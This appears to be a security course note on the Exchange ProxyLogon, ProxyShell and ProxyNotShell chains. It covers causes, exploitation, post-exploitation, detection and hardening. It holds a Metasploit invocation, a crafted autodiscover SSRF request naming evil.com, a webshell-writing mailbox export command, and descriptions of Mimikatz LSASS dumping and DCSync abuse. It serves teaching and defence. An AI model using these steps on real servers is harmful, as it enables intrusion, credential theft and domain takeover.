---
tags: [active-directory, exchange, proxylogon, proxyshell, proxynotshell]
difficulty: advanced
module: "36 - Active Directory Attacks"
topic: "36.29 Exchange Attacks"
---

# 36.29 Exchange — ProxyLogon, ProxyShell, ProxyNotShell

## 1. Introduction
Microsoft Exchange Server is one of the most critical applications in enterprise environments. Because it must handle external email traffic and webmail access (Outlook on the Web - OWA), Exchange servers are frequently exposed directly to the internet. Furthermore, by design, Exchange deeply integrates with Active Directory, making it a Tier 1 (often acting as Tier 0) asset. 

Between 2021 and 2022, a devastating series of vulnerability chains—**ProxyLogon**, **ProxyShell**, and **ProxyNotShell**—were discovered. These chains allowed unauthenticated, remote attackers to bypass authentication, execute code as `SYSTEM`, and subsequently compromise the entire Active Directory domain.

### ASCII Architecture Diagram: Exchange SSRF Attack Flow (Proxy-Style)

```text
       [ Attacker ]                              [ Exchange Server ]
      (Unauthenticated)                            (Internet Facing)
      +---------------+                             +---------------------------+
      |               |  1. Malicious Request       |  [Frontend (CAS) Port 443]|
      |               |  (e.g., /ecp/ext.js)        |  Handles auth & routing   |
      | HTTP Payload  |---------------------------->|                           |
      |               |  Cookie: X-BEResource=      +---------------------------+
      +---------------+  localhost/PowerShell/?               |
                                                              | 2. SSRF Bypass
                                                              v
                                                    +---------------------------+
                                                    |  [Backend Port 444]       |
                                                    |  Implicitly trusts CAS    |
                                                    |  Executes payload         |
                                                    +---------------------------+
                                                              |
                                                              v 3. RCE (SYSTEM)
                                                    [ Drop Webshell / Dump LSASS ]
```

## 2. The Root Cause: Exchange Architecture Flaws
Modern Exchange (2013, 2016, 2019) is split into two logical components:
1. **Frontend / Client Access Services (CAS)**: Listens on Port 443. Acts as a reverse proxy. It authenticates users and routes requests to the correct backend service.
2. **Backend**: Listens on Port 444 (and others). The backend performs the actual work (Mailbox, ECP, EWS, PowerShell).

**The Fatal Flaw**: The backend blindly trusts the frontend. If the frontend forwards a request, the backend assumes the frontend has already authenticated and authorized the user. If an attacker can force the frontend to make an arbitrary Server-Side Request Forgery (SSRF) request to the backend, they can bypass all authentication mechanisms. The backend APIs, such as Exchange PowerShell or EWS, grant immense control over the server and directory.

---

## 3. ProxyLogon (CVE-2021-26855, CVE-2021-27065) - March 2021
ProxyLogon was a pre-authenticated RCE vulnerability heavily exploited by state-sponsored actors (Hafnium).

### 3.1 The Vulnerability Chain
1. **SSRF (CVE-2021-26855)**: The attacker sends a crafted HTTP request to the Exchange frontend `/ecp` (Exchange Control Panel). They manipulate the `X-BEResource` cookie, dictating the URL the CAS proxy should forward the request to. By setting this to the backend server's internal name, the attacker achieves an SSRF, interacting with backend APIs unauthenticated.
2. **Auth Bypass**: Using the SSRF, the attacker accesses the Autodiscover service and extracts an overarching backend token, allowing them to impersonate the Exchange Administrator.
3. **RCE via Arbitrary File Write (CVE-2021-27065)**: As the "admin", the attacker accesses the ECP Virtual Directory API. They alter the configuration of the OAB (Offline Address Book) to include a malicious payload (an ASPX webshell). They then trigger the OAB to export to a specific file path on disk (e.g., `C:\inetpub\wwwroot\aspnet_client\shell.aspx`).

### 3.2 Exploitation Outcome
The attacker visits `/aspnet_client/shell.aspx` and has an interactive webshell running as `NT AUTHORITY\SYSTEM`.

---

## 4. ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) - August 2021
While ProxyLogon was patched, researchers discovered another chain exploiting the same architectural flaw but via a different vector.

### 4.1 The Vulnerability Chain
1. **SSRF via Autodiscover (CVE-2021-34473)**: Instead of targeting `/ecp` and cookies, attackers targeted `/autodiscover/autodiscover.json`. By crafting a URI like `/autodiscover/autodiscover.json?@foo.com/powershell/?...`, the CAS frontend gets confused. It attempts to resolve `foo.com`, fails, strips the suffix, and forwards the `/powershell` request directly to the backend, bypassing authentication.
2. **Privilege Escalation (CVE-2021-34523)**: Once talking to the backend PowerShell API, the attacker uses the `X-Rps-CAT` header to downgrade to a legacy authentication method, forcing Exchange to generate a valid administrative token.
3. **RCE via Mailbox Export (CVE-2021-31207)**: Using the PowerShell remoting API, the attacker runs the `New-MailboxExportRequest` cmdlet. They construct an email containing the ASPX webshell payload, save it to a mailbox, and export that mailbox to a `.pst` file placed inside a web-accessible directory (`C:\inetpub\wwwroot\aspnet_client\`). The PST file embeds the webshell, which the IIS server gladly executes.

### 4.2 ProxyShell Exploitation Execution
Using Metasploit:
```bash
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS 192.168.1.50
set LHOST 192.168.1.10
exploit
```
The exploit automates the SSRF, creates the PST file, drops the shell, and establishes a Meterpreter session.

---

## 5. ProxyNotShell (CVE-2022-41040, CVE-2022-41082) - Sept 2022
ProxyNotShell proved that Microsoft's previous patches were incomplete. Attackers found a way to trigger the exact same SSRF and RCE flow, but this time it required authentication. 

### 5.1 The Vulnerability Chain
1. **Authentication Required**: The attacker needs compromised credentials for *any* standard user with a mailbox.
2. **SSRF via Autodiscover**: Attackers used a variant of the ProxyShell Autodiscover bypass, but authenticated.
3. **RCE via PowerShell Serialization**: Attackers targeted the Exchange Management Shell (PowerShell) backend. By submitting malicious serialized data via the `X-Rps-CAT` headers, they triggered a deserialization vulnerability leading to SYSTEM RCE.

---

## 6. Post-Exploitation: From Exchange to Domain Admin
Exchange runs as a highly privileged computer account in AD. Once SYSTEM on an Exchange server is achieved, the forest is usually lost.

1. **Dumping Memory**: Attackers use the webshell to run ProcDump or Mimikatz, extracting `lsass.exe` to steal administrator credentials that have logged into the server.
2. **Exchange Permissions**: Exchange servers often have `WriteDacl` permissions over the domain or hold extensive rights to manage Active Directory objects. Attackers can use PowerView from the Exchange server to grant themselves DCSync privileges.
3. **Lateral Movement**: Attackers pivot through the Exchange server to attack internal Domain Controllers via SMB.
4. **Data Exfiltration**: Extracting massive volumes of sensitive corporate emails via EWS or PowerShell.

## 7. Detection and Forensics

### 7.1 ProxyLogon / ProxyShell Artifacts
- **IIS Logs (`C:\inetpub\logs\LogFiles\W3SVC1`)**: Look for massive spikes in requests to `/autodiscover/autodiscover.json`, `/ecp`, and `/powershell`.
- **Unexpected ASPX files**: Search for `.aspx` files in `C:\inetpub\wwwroot\aspnet_client\` or `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\`. Common webshell names like `shell.aspx`, `error.aspx`, or randomly generated names should be investigated.
- **Exchange Server Logs**: Inspect `C:\Program Files\Microsoft\Exchange Server\V15\Logging\`.
- **Event ID 4688**: Monitor for `w3wp.exe` (IIS Worker Process) spawning `cmd.exe` or `powershell.exe`. This is a classic indicator of a webshell executing operating system commands.

### 7.2 Proactive Threat Hunting
Regularly scan Exchange directories with YARA rules designed to detect ASPX webshell signatures. Monitor the creation of PST exports initiated from unexpected PowerShell sessions.

## 8. Mitigation and Hardening

### 8.1 Patching and Cumulative Updates
Exchange vulnerabilities are patched via Cumulative Updates (CUs) and Security Updates (SUs). Organizations must remain on the latest CU to apply SUs. Delaying patches for Exchange is one of the highest risk decisions an organization can make.

### 8.2 Attack Surface Reduction
- **Do not expose ECP / PowerShell to the Internet**: Webmail (OWA) may be required externally, but the Exchange Control Panel (`/ecp`) and Remote PowerShell should be blocked at the perimeter firewall or via IIS URL Rewrite rules.
- **Implement WAF**: Use a Web Application Firewall to inspect inbound traffic for malicious URI payloads, specifically targeting Autodiscover anomalies.
- **Enable Antivirus Exclusions Carefully**: Historically, administrators excluded Exchange directories from AV scanning for performance. This allowed webshells to live undetected. Modern EDR should monitor these paths.

## 9. Conclusion
The Proxy* series of vulnerabilities devastated organizations globally. They highlight the extreme risk of exposing complex, legacy, AD-integrated software directly to the internet. Because the Exchange architecture implicitly trusts its frontend components, SSRF vulnerabilities immediately equate to total remote system compromise. As attackers continue to focus on Edge services, securing and monitoring Exchange is paramount.

## Real-World Attack Scenario

During an external penetration test, the red team identified an on-premises Microsoft Exchange 2016 server exposed to the internet. Checking the server headers and build numbers revealed it was missing the critical August 2021 Security Updates, making it vulnerable to the ProxyShell exploit chain.

The attacker did not have any domain credentials, so they opted for the unauthenticated ProxyShell attack. They utilized a custom Python script that sent a crafted HTTP request to the `/autodiscover/autodiscover.json` endpoint, manipulating the URI to confuse the Client Access Service (CAS) frontend:
```text
GET /autodiscover/autodiscover.json?@evil.com/powershell/?X-Rps-CAT=... HTTP/1.1
```
This triggered a Server-Side Request Forgery (SSRF). The CAS blindly forwarded the request to the Exchange backend, bypassing all authentication and granting the attacker access to the backend PowerShell remoting API as the `SYSTEM` account.

Once connected to the backend API, the attacker executed the `New-MailboxExportRequest` cmdlet to write an ASPX webshell payload encoded within a draft email. They exported the mailbox to a `.pst` file directly into a publicly accessible web directory:
```powershell
New-MailboxExportRequest -Mailbox Administrator -FilePath "\\127.0.0.1\C$\inetpub\wwwroot\aspnet_client\discover.aspx"
```

The attacker then navigated to `https://mail.target.com/aspnet_client/discover.aspx` in their browser, accessing the active webshell. Because Exchange's IIS worker process (`w3wp.exe`) runs as `NT AUTHORITY\SYSTEM`, the attacker had total control over the server. They immediately used the webshell to execute a PowerShell memory cradle that loaded Mimikatz and dumped the LSASS process, yielding plaintext credentials for an Enterprise Admin who had recently logged into the Exchange server to perform maintenance, resulting in a full domain compromise.

## 10. Chaining Opportunities
- **[[23 - DCSync Attacks]]**: Often executed immediately after compromising an Exchange server to dump the AD hashes.
- **[[10 - Initial Access & Phishing]]**: ProxyNotShell requires a standard user account, often gained via phishing.
- **[[17 - Lateral Movement via WMI and WinRM]]**: Pivoting from the compromised IIS server into the internal network.

## 11. Related Notes
- [[13 - Windows Privilege Escalation]]
- [[30 - Defense — Tiering, Least Privilege, LAPS, Defender for Identity]]
